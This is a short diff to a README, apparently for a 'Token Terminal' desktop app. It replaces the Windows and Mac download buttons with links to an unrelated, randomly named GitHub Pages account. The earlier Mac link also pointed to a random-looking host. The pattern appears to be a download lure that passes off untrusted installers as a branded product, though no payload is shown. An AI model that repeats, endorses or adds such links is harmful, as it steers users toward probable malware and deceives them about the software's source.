@@ -6,9 +6,9 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://token-terminal-desktop.github.io/.github)  
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://jakeescobarmfta.github.io/.github/Token-Terminal)  
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://uasdgashdsj741.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://jakeescobarmfta.github.io/.github/Token-Terminal)
 </div>
 
 ---
